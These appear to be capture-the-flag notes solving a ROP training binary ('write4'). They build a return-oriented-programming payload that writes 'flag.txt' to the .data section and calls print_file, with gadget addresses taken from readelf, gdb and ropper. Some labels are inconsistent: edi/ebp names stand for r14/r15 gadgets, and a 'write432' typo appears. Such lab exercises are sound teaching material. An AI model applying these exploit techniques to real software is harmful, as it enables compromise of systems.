# Build the payload
```
payload = flat({
    offset: [ pop_edi_pop_ebp,
    data_section_address,
    'flag.txt',
    mov_edi_ebp,
    pop_rdi,
    data_section_address,
    print_file
    ]
})
```
# Payload reasoning
```
    pop_edi_pop_ebp,        #Pop r14 and r15 with next 2 variables\
    data_section_address,   #Where I am putting data\
    'flag.txt',             #Data to be put (64Bit allows more than 4 characters per register along with size being 10)\
    mov_edi_ebp,            #Moving to right location\
    pop_rdi,                #Pop rdi before function call\
    data_section_address,   #What I am telling it to read\
    print_file              #Function to read something\
```

# Where to start?
    Find a place to store flag.txt
    Find a way to write it
    Store it
    pop rdi because 64Bit
    Once stored, go to read_file and pass the txt location

# How do you know what to do???
    data_section_address = 0x0000000000601028
        readelf -S write4
            [Nr] Name              Type             Address           Offset        Size              EntSize          Flags  Link  Info  Align
            [23] .data             PROGBITS         0000000000601028  00001028      0000000000000010  0000000000000000  WA       0     0     8

            Addr is what I need
            Size is how much I can write
            **W flag means I can write to it**
    
    mov_edi_ebp = 0x0000000000400628
        gdb write432
        disas usefulGadgets
            0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
            I now need something that pops r15 into r14
    
    print_file = 0x0000000000400510
        gdb write4
        disas usefulFunctions
            0x400510 <print_file@plt>

    pop_edi_pop_ebp = 0x0000000000400690
        ropper -f write4 --search pop
            0x0000000000400690: pop r14; pop r15; ret; 
    
    pop_rdi = 0x0000000000400693
        ropper -f write4 --search pop
            0x0000000000400693: pop rdi; ret; 
